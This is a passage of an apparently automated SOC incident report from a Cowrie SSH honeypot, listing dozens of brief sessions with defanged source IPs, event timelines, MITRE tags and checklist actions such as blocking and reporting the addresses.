| **Last Seen** | 2026-08-21 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:25:11` | `cowrie.session.connect` |
| `2026-08-21 07:25:12` | `cowrie.client.version` |
| `2026-08-21 07:25:12` | `cowrie.client.kex` |
| `2026-08-21 07:25:14` | `cowrie.login.success` |
| `2026-08-21 07:25:15` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.104.77[.]75` to AbuseIPDB if not already reported
- [ ] Block `58.104.77[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f740c3e717

| Field | Detail |
|---|---|
| **Source IP** | `178.214.160[.]4` |
| **First Seen** | 2026-08-21 07:25 |
| **Last Seen** | 2026-08-21 07:25 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:25:22` | `cowrie.session.connect` |
| `2026-08-21 07:25:24` | `cowrie.client.version` |
| `2026-08-21 07:25:24` | `cowrie.client.kex` |
| `2026-08-21 07:25:28` | `cowrie.login.success` |
| `2026-08-21 07:25:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.214.160[.]4` to AbuseIPDB if not already reported
- [ ] Block `178.214.160[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e821d6129a4a

| Field | Detail |
|---|---|
| **Source IP** | `183.239.20[.]236` |
| **First Seen** | 2026-08-21 07:25 |
| **Last Seen** | 2026-08-21 07:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:25:29` | `cowrie.session.connect` |
| `2026-08-21 07:25:30` | `cowrie.client.version` |
| `2026-08-21 07:25:30` | `cowrie.client.kex` |
| `2026-08-21 07:25:32` | `cowrie.login.success` |
| `2026-08-21 07:25:33` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.239.20[.]236` to AbuseIPDB if not already reported
- [ ] Block `183.239.20[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7372df6e0532

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-08-21 07:25 |
| **Last Seen** | 2026-08-21 07:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:25:39` | `cowrie.session.connect` |
| `2026-08-21 07:25:40` | `cowrie.client.version` |
| `2026-08-21 07:25:40` | `cowrie.client.kex` |
| `2026-08-21 07:25:43` | `cowrie.login.success` |
| `2026-08-21 07:25:43` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03bd373576c1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:27 |
| **Last Seen** | 2026-08-21 07:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:27:55` | `cowrie.session.connect` |
| `2026-08-21 07:27:55` | `cowrie.client.version` |
| `2026-08-21 07:27:55` | `cowrie.client.kex` |
| `2026-08-21 07:27:57` | `cowrie.login.success` |
| `2026-08-21 07:27:58` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:27:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:27:58` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a4dcd3c499

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:27 |
| **Last Seen** | 2026-08-21 07:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:27:59` | `cowrie.session.connect` |
| `2026-08-21 07:27:59` | `cowrie.client.version` |
| `2026-08-21 07:27:59` | `cowrie.client.kex` |
| `2026-08-21 07:28:02` | `cowrie.login.success` |
| `2026-08-21 07:28:02` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:28:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:28:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6dd856a0d3a

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-08-21 07:32 |
| **Last Seen** | 2026-08-21 07:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:32:31` | `cowrie.session.connect` |
| `2026-08-21 07:32:32` | `cowrie.client.version` |
| `2026-08-21 07:32:32` | `cowrie.client.kex` |
| `2026-08-21 07:32:33` | `cowrie.login.success` |
| `2026-08-21 07:32:34` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5799817aa0

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-08-21 07:32 |
| **Last Seen** | 2026-08-21 07:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:32:41` | `cowrie.session.connect` |
| `2026-08-21 07:32:43` | `cowrie.client.version` |
| `2026-08-21 07:32:43` | `cowrie.client.kex` |
| `2026-08-21 07:32:45` | `cowrie.login.success` |
| `2026-08-21 07:32:48` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa27a41f31d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:38 |
| **Last Seen** | 2026-08-21 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:38:18` | `cowrie.session.connect` |
| `2026-08-21 07:38:18` | `cowrie.client.version` |
| `2026-08-21 07:38:18` | `cowrie.client.kex` |
| `2026-08-21 07:38:22` | `cowrie.login.success` |
| `2026-08-21 07:38:23` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:38:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:38:23` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa3379f17b4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:38 |
| **Last Seen** | 2026-08-21 07:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:38:23` | `cowrie.session.connect` |
| `2026-08-21 07:38:23` | `cowrie.client.version` |
| `2026-08-21 07:38:23` | `cowrie.client.kex` |
| `2026-08-21 07:38:24` | `cowrie.login.success` |
| `2026-08-21 07:38:25` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:38:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:38:26` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c161c2a052b9

| Field | Detail |
|---|---|
| **Source IP** | `82.65.183[.]240` |
| **First Seen** | 2026-08-21 07:48 |
| **Last Seen** | 2026-08-21 07:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:48:34` | `cowrie.session.connect` |
| `2026-08-21 07:48:34` | `cowrie.client.version` |
| `2026-08-21 07:48:34` | `cowrie.client.kex` |
| `2026-08-21 07:48:35` | `cowrie.login.success` |
| `2026-08-21 07:48:35` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.183[.]240` to AbuseIPDB if not already reported
- [ ] Block `82.65.183[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fdee0fbfab8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:48 |
| **Last Seen** | 2026-08-21 07:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:48:52` | `cowrie.session.connect` |
| `2026-08-21 07:48:52` | `cowrie.client.version` |
| `2026-08-21 07:48:52` | `cowrie.client.kex` |
| `2026-08-21 07:48:54` | `cowrie.login.success` |
| `2026-08-21 07:48:56` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:48:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:48:56` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5348d14a255

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:48 |
| **Last Seen** | 2026-08-21 07:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:48:57` | `cowrie.session.connect` |
| `2026-08-21 07:48:57` | `cowrie.client.version` |
| `2026-08-21 07:48:57` | `cowrie.client.kex` |
| `2026-08-21 07:48:59` | `cowrie.login.success` |
| `2026-08-21 07:48:59` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:48:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:48:59` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a1ad30e54fc

| Field | Detail |
|---|---|
| **Source IP** | `37.255.197[.]138` |
| **First Seen** | 2026-08-21 07:50 |
| **Last Seen** | 2026-08-21 07:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:50:23` | `cowrie.session.connect` |
| `2026-08-21 07:50:25` | `cowrie.client.version` |
| `2026-08-21 07:50:25` | `cowrie.client.kex` |
| `2026-08-21 07:50:29` | `cowrie.login.success` |
| `2026-08-21 07:50:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.255.197[.]138` to AbuseIPDB if not already reported
- [ ] Block `37.255.197[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc337955c42

| Field | Detail |
|---|---|
| **Source IP** | `138.122.242[.]42` |
| **First Seen** | 2026-08-21 07:55 |
| **Last Seen** | 2026-08-21 07:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:55:17` | `cowrie.session.connect` |
| `2026-08-21 07:55:17` | `cowrie.client.version` |
| `2026-08-21 07:55:17` | `cowrie.client.kex` |
| `2026-08-21 07:55:19` | `cowrie.login.success` |
| `2026-08-21 07:55:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.122.242[.]42` to AbuseIPDB if not already reported
- [ ] Block `138.122.242[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba84fbb27d4c

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-08-21 07:55 |
| **Last Seen** | 2026-08-21 07:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:55:25` | `cowrie.session.connect` |
| `2026-08-21 07:55:26` | `cowrie.client.version` |
| `2026-08-21 07:55:26` | `cowrie.client.kex` |
| `2026-08-21 07:55:30` | `cowrie.login.success` |
| `2026-08-21 07:55:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-450123cf2727

| Field | Detail |
|---|---|
| **Source IP** | `121.167.110[.]137` |
| **First Seen** | 2026-08-21 07:58 |
| **Last Seen** | 2026-08-21 07:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:58:25` | `cowrie.session.connect` |
| `2026-08-21 07:58:26` | `cowrie.client.version` |
| `2026-08-21 07:58:26` | `cowrie.client.kex` |
| `2026-08-21 07:58:28` | `cowrie.login.success` |
| `2026-08-21 07:58:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.167.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `121.167.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc27680e936

| Field | Detail |
|---|---|
| **Source IP** | `116.114.94[.]242` |
| **First Seen** | 2026-08-21 07:58 |
| **Last Seen** | 2026-08-21 07:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:58:35` | `cowrie.session.connect` |
| `2026-08-21 07:58:35` | `cowrie.client.version` |
| `2026-08-21 07:58:35` | `cowrie.client.kex` |
| `2026-08-21 07:58:37` | `cowrie.login.success` |
| `2026-08-21 07:58:38` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `116.114.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d85403659c7

| Field | Detail |
|---|---|
| **Source IP** | `109.237.96[.]127` |
| **First Seen** | 2026-08-21 07:59 |
| **Last Seen** | 2026-08-21 07:59 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:59:03` | `cowrie.session.connect` |
| `2026-08-21 07:59:08` | `cowrie.client.version` |
| `2026-08-21 07:59:08` | `cowrie.client.kex` |
| `2026-08-21 07:59:31` | `cowrie.login.success` |
| `2026-08-21 07:59:43` | `cowrie.session.params` |
| `2026-08-21 07:59:43` | `cowrie.command.input` |
| `2026-08-21 07:59:49` | `cowrie.log.closed` |
| `2026-08-21 07:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.237.96[.]127` to AbuseIPDB if not already reported
- [ ] Block `109.237.96[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bf96d8e904b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:59 |
| **Last Seen** | 2026-08-21 07:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:59:38` | `cowrie.session.connect` |
| `2026-08-21 07:59:38` | `cowrie.client.version` |
| `2026-08-21 07:59:39` | `cowrie.client.kex` |
| `2026-08-21 07:59:43` | `cowrie.login.success` |
| `2026-08-21 07:59:44` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:59:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:59:44` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56dd0936421

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 07:59 |
| **Last Seen** | 2026-08-21 07:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 07:59:43` | `cowrie.session.connect` |
| `2026-08-21 07:59:43` | `cowrie.client.version` |
| `2026-08-21 07:59:43` | `cowrie.client.kex` |
| `2026-08-21 07:59:46` | `cowrie.login.success` |
| `2026-08-21 07:59:48` | `cowrie.direct-tcpip.request` |
| `2026-08-21 07:59:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 07:59:48` | `cowrie.direct-tcpip.data` |
| `2026-08-21 07:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e3c0c3a627

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]136` |
| **First Seen** | 2026-08-21 08:05 |
| **Last Seen** | 2026-08-21 08:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:05:51` | `cowrie.session.connect` |
| `2026-08-21 08:05:51` | `cowrie.client.version` |
| `2026-08-21 08:05:51` | `cowrie.client.kex` |
| `2026-08-21 08:05:53` | `cowrie.login.success` |
| `2026-08-21 08:05:53` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]136` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb968010b0b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:10 |
| **Last Seen** | 2026-08-21 08:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:10:22` | `cowrie.session.connect` |
| `2026-08-21 08:10:22` | `cowrie.client.version` |
| `2026-08-21 08:10:23` | `cowrie.client.kex` |
| `2026-08-21 08:10:25` | `cowrie.login.success` |
| `2026-08-21 08:10:27` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:10:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:10:27` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a50217224f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:10 |
| **Last Seen** | 2026-08-21 08:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:10:27` | `cowrie.session.connect` |
| `2026-08-21 08:10:27` | `cowrie.client.version` |
| `2026-08-21 08:10:27` | `cowrie.client.kex` |
| `2026-08-21 08:10:29` | `cowrie.login.success` |
| `2026-08-21 08:10:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:10:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:10:29` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2dfaac1395a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:21 |
| **Last Seen** | 2026-08-21 08:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
